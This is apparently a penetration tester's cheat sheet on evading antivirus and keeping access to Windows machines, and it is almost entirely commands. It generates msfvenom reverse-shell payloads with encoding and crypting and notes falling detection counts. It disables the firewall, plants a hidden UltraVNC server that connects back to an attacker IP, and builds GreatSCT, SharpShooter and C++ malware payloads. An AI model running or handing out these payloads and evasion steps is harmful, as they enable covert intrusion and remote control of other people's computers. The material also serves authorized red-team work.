## Bypass w/ msfvenom

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -o shell.exe # 30/46
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell.exe # 34/46
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.23 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell.exe # 27/46
wine /usr/share/windows-binaries/hyperion/hyperion.exe shell.exe crypted.exe # 14/46
# custom python reverse shell compiled to exe # 2/46
# custom C reverse shellcode compiled to exe # 1/46

## telnet server (pre windows-10)
as admin, install it:
`pkgmgr /iu:"TelnetServer" /quiet`
run it via
`sc config TlntSVR start= auto obj= localsystem`
change port + disable firewall
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

## UltraVNC
Download it from: http://www.uvnc.com/downloads/ultravnc.html​
Execute winvnc.exe and configure the server:
Enable the option *Disable TrayIcon*
Set a password in *VNC Password*
Set a password in *View-Only Password*
Then, move the binary `winvnc.exe` and newly created file `UltraVNC.ini` inside the victim
*Reverse connection*
The attacker should execute inside his host the binary `vncviewer.exe -listen 5900` so it will be prepared to catch a reverse VNC connection.
Then, it should execute inside the victim:
```
winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900
```
## GreatSCT
```
use 1
list
use 9 
set lhost 10.10.14.3
set lport 9999
generate
```
(payload and rc file will be in /usr/share/greatsct-output)
execute it on victim with:
`C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml`

# C++
```
sudo apt-get install mingw-w64
i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -stat
```
https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp
## customizing MSFVenom payloads to bypass AV
Merlin, Empire, Puppy, SalsaTools https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/
​https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf​
https://github.com/l0ss/Grouper2

# Csharp
C# obfuscators list: https://github.com/NotPrab/.NET-Obfuscator
## OTHER TOOLS
sgn : shigata-ga-nai for go 
xeexee-top-antivirus-evasion
# Veil Framework:
https://github.com/Veil-Framework/Veil
# Shellter
https://www.shellterproject.com/download/
# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless: 
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
# Stageless HTA Payload: 
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
# Donut: 
https://github.com/TheWover/donut
# Vulcan
https://github.com/praetorian-code/vulcan
